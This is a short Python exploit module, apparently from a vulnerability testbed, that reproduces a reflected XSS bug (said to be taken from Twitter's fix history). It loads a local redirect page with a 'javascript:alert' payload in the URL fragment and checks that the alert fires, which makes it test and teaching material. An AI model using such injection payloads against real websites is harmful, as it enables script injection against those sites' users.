from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
	  'Name' :		  'ReflectedXSSExploit',
	  'Description' : "Example of reflected XSS injection (example is taken from Twitter fix history).",
	  'References' :  [["empty"]],
	  'Target' :	  "xssreflected",
	  'Container': 'ubuntu-node',
	  'TargetLicense' : '',
	  'Plugin' : '',
	  'VulWikiPage' : "None",
	  'Type' : 'ReflectedXSS'
	}

	def runExploit(self):
		w = self.wrapper
		w.navigate("http://localhost:%s/redirect.html" % mapped_port_host)
		w.navigate("http://localhost:%s/redirect.html?#!javascript:alert('XSS')" % mapped_port_host)
		alert_text = w.handle_alert()
		self.assertIn("XSS", alert_text, "Exploit didn't work!")
